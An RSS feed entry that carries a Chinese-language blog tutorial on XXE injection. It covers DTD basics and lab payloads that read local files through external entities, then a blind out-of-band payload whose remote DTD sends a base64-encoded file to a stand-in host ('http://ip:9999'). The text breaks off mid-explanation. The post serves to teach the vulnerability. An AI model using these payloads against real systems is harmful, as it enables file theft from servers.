<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>yym&#39;s blog</title>
    <link>http://yoursite.com/</link>
    
    <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
    
    <description>hello world</description>
    <pubDate>Wed, 20 May 2020 07:41:38 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>XXE漏洞原理</title>
      <link>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</link>
      <guid>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</guid>
      <pubDate>Tue, 19 May 2020 00:08:40 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><p>xxe漏洞主要针对web-service危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等．首先存在漏洞的web服务一定是存在xml传输数据的，可以在http头的content-type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）．或者一些常见的采用xml的java服务配置文件（spring，struts2）．不过现实中存在的大多数xxe漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机．</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>XML</li><li>DTD</li></ul><h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p>XML 指可扩展标记语言（eXtensible Markup  Language）。</p><p>XML 被设计用来传输和存储数据。</p><p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p><p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。（这里不解释js如何读取xml数据）</p><h4 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><p>这是一个xml结构：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>                //这一行是 XML 文档定义</span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>                                               //定义一个根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span>                             //定义子元素receiver的内容为Myself</span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span>                                //同上</span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span>                            //同上</span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span>                      //同上</span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span>                                              //根元素结尾标签</span><br></pre></td></tr></table></figure></div><p>如果使用DTD来定义：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>                                   //这一行是 XML 文档定义</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [                                     //定义一个根元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> (<span class="meta-keyword">receiver</span> ,<span class="meta-keyword">sender</span> ,<span class="meta-keyword">header</span> ,<span class="meta-keyword">msg</span>)&gt;</span>      //定义根元素包含的子元素，通过圆括号定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">receiver</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                           //定义子元素(#PCDATA)表示只有数据的元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">sender</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                             //同上 </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">header</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">msg</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//紧跟在XML标头之后，是文档类型声明，通常称为`DOCTYPE`</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//DOCTYPE声明后跟DTD的主体，可以在主体中声明 "元素"，"属性"，"实体" 和 "符号" </span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//方括号[]包含一个称为内部子集的可选实体声明列表。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//带有一个或多个子元素的元素通过圆括号中的子元素名进行声明</span></span><br></pre></td></tr></table></figure></div><p>DTD语法<br>所有DTD元素声明都有这种一般形式 </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><figcaption><span>elementname (content)></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT elementname (content)&gt;</span><br></pre></td></tr></table></figure></div><ul><li><p><code>ELEMENT</code>声明用于指示要定义元素的解析器。</p></li><li><p><code>elementname</code>是定义的元素名称(也称为通用标识符)。</p></li><li><p><code>content</code>定义了元素中可以包含的内容(如果有的话)。</p></li></ul><h3 id="什么是实体注入"><a href="#什么是实体注入" class="headerlink" title="什么是实体注入"></a>什么是实体注入</h3><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">"test"</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明</span><br><span class="line">//通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合</span><br></pre></td></tr></table></figure></div><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/test.dtd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure></div><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><h4 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h4><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/win.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)<font color=red>只有在 DTD 文件中，参数实体的声明才能引用其他实体</font><br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">an-element</span> <span class="meta-string">"&lt;!ELEMENT mytag (subtag)&gt;"</span>&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote-dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://somewhere.example.org/remote.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="perl">%an-element; %remote-dtd;</span></span><br></pre></td></tr></table></figure></div><p><strong>抛砖：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h4 id="我们能做什么？"><a href="#我们能做什么？" class="headerlink" title="我们能做什么？"></a>我们能做什么？</h4><p>上面疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/test.dtd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>本地服务器上放上解析 XML 的 php 代码：</p><p><strong>示例代码：</strong></p><p><strong>xml.php</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);             <span class="comment">//关闭禁用xml外部实体</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>); </span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();                         <span class="comment">//创建xml对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     </span><br><span class="line">    $creds = simplexml_import_dom($dom);               </span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//file_get_contents() 函数把整个文件读入一个字符串中。php://input 是个可以访问请求的原始数据的只读流。</span></span><br><span class="line">这里相当于获取post过去的xml代码</span><br><span class="line"><span class="comment">//loadxml加载xml代码</span></span><br><span class="line"><span class="comment">//LIBXML_NOENT: 将 XML中的实体引用替换成对应的值</span></span><br><span class="line"><span class="comment">//LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span></span><br><span class="line"><span class="comment">//simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br></pre></td></tr></table></figure></div><p><strong>payload:</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>结果如下图：</strong></p><p><img src="https://i.imgur.com/3MhyU4U.png" alt=""></p><p>成功读取system.in文件内容</p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p><p><strong>如图所示：</strong></p><p><img src="https://i.imgur.com/LxYOrGA.png" alt=""></p><p><strong>结果如下图：</strong></p><p><img src="https://i.imgur.com/XGXPp9F.png" alt=""></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下：</p><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure></div><p>可以输入任意字符除了 ]]&gt; 不能嵌套</p><p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 <code>&lt;![CDATA[&quot; 和 &quot;]]&gt;</code>,但是好像没有任何语法告诉我们字符串能拼接的。</p><p><strong>使用参数实体引用其他实体</strong></p><p><strong>payload:</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///d:/test.txt"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/evil.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>evil.dtd</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">"%start;%goodies;%end;"</span>&gt;</span>            //引用start，goodies，end实体内容，CDATA输出</span><br><span class="line"></span><br><span class="line">//参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾。一般实体的定义无%开头，引用以&amp;开头，以;结尾</span><br></pre></td></tr></table></figure></div><p><strong>结果如图：</strong></p><p><img src="https://i.imgur.com/rPu8UmV.png" alt=""></p><h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><h4 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a>新的问题出现</h4><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><h4 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a>新的解决方法</h4><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p><p><strong>xml.php</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">libxml_disable_entity_loader (<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div><p><strong>test.dtd</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64 encode/resource=file:///D:/test.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37 send SYSTEM 'http://ip:9999?p=%file;'&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//因为实体的值中不能有 %, 所以讲send前的 “%” 转换成html实体编码 “&amp;#37”;</span><br></pre></td></tr></table></figure></div><p><strong>payload：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>结果如图：</strong></p><p>环境问题，先不搭了——</p><p><strong>整个调用过程：</strong></p><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 